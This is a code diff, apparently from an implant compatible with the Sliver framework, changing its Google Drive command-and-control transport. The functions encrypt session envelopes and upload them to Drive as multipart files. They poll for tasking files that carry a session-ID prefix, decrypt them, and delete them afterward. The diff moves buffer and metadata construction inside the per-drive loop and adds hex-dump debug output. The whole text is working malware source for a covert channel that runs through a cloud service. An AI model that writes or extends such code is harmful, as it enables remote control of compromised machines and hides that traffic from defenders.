@@ -134,6 +134,7 @@ BOOL DriveStart
 	}
 
 	lpUniqueBoundary = GenRandomStr(16);
+	lpBody = ALLOC(cbEncryptedSessionInit + 0x400);
 	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
 	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
 		pDriveConfig = pDriveClient->DriveList[i];
@@ -147,15 +148,9 @@ BOOL DriveStart
 
 		SecureZeroMemory(szName, sizeof(szName));
 		SecureZeroMemory(szMetadata, sizeof(szMetadata));
+		SecureZeroMemory(lpBody, cbEncryptedSessionInit + 0x400);
 		wsprintfA(szName, "Hello.%s", pDriveConfig->lpStartExtension);
 		wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
-
-		if (lpBody != NULL) {
-			FREE(lpBody);
-			lpBody = NULL;
-		}
-
-		lpBody = ALLOC(cbEncryptedSessionInit + 0x400);
 		cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szName);
 		memcpy(&lpBody[cbBody], pEncryptedSessionInit, cbEncryptedSessionInit);
 		cbBody += cbEncryptedSessionInit;
@@ -242,6 +237,8 @@ BOOL DriveSend
 	PHTTP_RESP pResp = NULL;
 	PBUFFER pCipherText = NULL;
 
+	PrintFormatA("----------------------------------------------------\nSend Envelope:\n");
+	HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
 	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
 	pCipherText = SliverEncrypt(pConfig, pMarshalledEnvelope);
 	pUri = UriInit(szUrl);
@@ -264,14 +261,7 @@ BOOL DriveSend
 		}
 	}
 
-	SecureZeroMemory(szName, sizeof(szName));
-	wsprintfA(szName, "%s_%d.%s", pConfig->szSessionID, pDriveClient->dwSendCounter, pDriveConfig->lpSendExtension);
-	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
 	lpUniqueBoundary = GenRandomStr(16);
-	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szName);
-	memcpy(&lpBody[cbBody], pCipherText->pBuffer, pCipherText->cbBuffer);
-	cbBody += pCipherText->cbBuffer;
-	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
 	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
 	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
 		pDriveConfig = pDriveClient->DriveList[i];
@@ -283,6 +273,15 @@ BOOL DriveSend
 			continue;
 		}
 
+		SecureZeroMemory(szName, sizeof(szName));
+		SecureZeroMemory(szMetadata, sizeof(szMetadata));
+		SecureZeroMemory(lpBody, pCipherText->cbBuffer + 0x400);
+		wsprintfA(szName, "%s_%d.%s", pConfig->szSessionID, pDriveClient->dwSendCounter, pDriveConfig->lpSendExtension);
+		wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
+		cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szName);
+		memcpy(&lpBody[cbBody], pCipherText->pBuffer, pCipherText->cbBuffer);
+		cbBody += pCipherText->cbBuffer;
+		cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
 		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
 		if (pResp->dwStatusCode != HTTP_STATUS_OK) {
 			FreeHttpResp(pResp);
@@ -336,11 +335,9 @@ PENVELOPE DriveRecv
 	CHAR szSessionIdPrefix[33];
 	LPSTR lpFileId = NULL;
 
-	SecureZeroMemory(szPattern, sizeof(szPattern));
 	SecureZeroMemory(szSessionIdPrefix, sizeof(szSessionIdPrefix));
 	lstrcpyA(szSessionIdPrefix, pConfig->szSessionID);
 	szSessionIdPrefix[8] = '\0';
-	wsprintfA(szPattern, "%s_%d.%s", szSessionIdPrefix, pDriveClient->dwRecvCounter, pDriveConfig->lpRecvExtension);
 	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
 		pDriveConfig = pDriveClient->DriveList[i];
 		if (pDriveConfig == NULL) {
@@ -352,6 +349,8 @@ PENVELOPE DriveRecv
 			lpFileId = NULL;
 		}
 
+		SecureZeroMemory(szPattern, sizeof(szPattern));
+		wsprintfA(szPattern, "%s_%d.%s", szSessionIdPrefix, pDriveClient->dwRecvCounter, pDriveConfig->lpRecvExtension);
 		lpFileId = GetFileId(pDriveClient, pDriveConfig, szPattern);
 		if (lpFileId == NULL) {
 			continue;
@@ -397,6 +396,8 @@ PENVELOPE DriveRecv
 		pDecodedData = SliverBase64Decode(pRespData->pBuffer);
 		pPlainText = SliverDecrypt(pConfig, pDecodedData);
 		pResult = UnmarshalEnvelope(pPlainText);
+		PrintFormatA("----------------------------------------------------\nReceive Envelope:\n");
+		HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
 
 		FreeHttpResp(pResp);
 		DriveDelete(pDriveClient, pDriveConfig, lpFileId);
